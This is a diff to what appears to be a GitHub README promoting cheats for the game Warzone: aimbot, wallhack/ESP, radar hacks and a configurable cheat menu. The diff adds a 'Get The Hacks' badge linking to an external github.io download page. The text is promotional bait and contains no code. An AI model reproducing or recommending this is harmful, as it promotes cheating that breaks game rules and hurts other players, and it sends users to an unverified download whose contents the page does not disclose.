@@ -4,6 +4,8 @@
 
 Warzone is one of the toughest battle royales around. Sweaty players, insane recoil control, rooftop campers, and third-party chaos make every match unpredictable. If you’re tired of being outplayed, **Warzone hacks** give you the edge. From **aimbot** for perfect accuracy, to **ESP and wallhack** for x-ray vision, and **radar hacks** for full awareness, these tools make sure you’re always in control.
 
+[![Get](https://img.shields.io/badge/Get%20The-Hacks-blueviolet)](https://warzone-hacks.github.io/.github/)
+
 With a full **cheat menu**, you can customize your hacks in real time—whether you want a legit look with smooth aim or to go full rage mode with instant-lock accuracy.
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/455e5ad8-8679-4be4-85dd-ea36604b82e2" />
 
